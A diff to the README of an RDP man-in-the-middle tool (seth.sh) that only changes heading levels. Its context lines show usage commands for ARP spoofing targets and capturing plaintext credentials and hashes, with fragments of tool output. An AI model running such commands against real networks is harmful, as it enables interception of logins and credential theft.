@@ -63,7 +63,7 @@ optional arguments:
 
 ## Examples
 
-#### Start MiTM attack
+### Start MiTM attack
 
 | Attacker IP | IP to ARP spoof for | Target RDP to connect to |
 | :-: | :-: | :-: |
@@ -91,7 +91,7 @@ $ sudo ./seth.sh eth0 10.10.10.{10,15,20}
 [*] Done
 ```
 
-#### Capture of plaintext credentials
+### Capture of plaintext credentials
 
 ```plain
 sudo ./seth.sh enp0s31f6 10.10.10.5 10.10.10.7 10.10.10.10
@@ -126,7 +126,7 @@ Hiding forged protocol request from client
 [*] Done
 ```
 
-#### Example capture of hashes
+### Example capture of hashes
 
 ![Example](images/example.png)
 
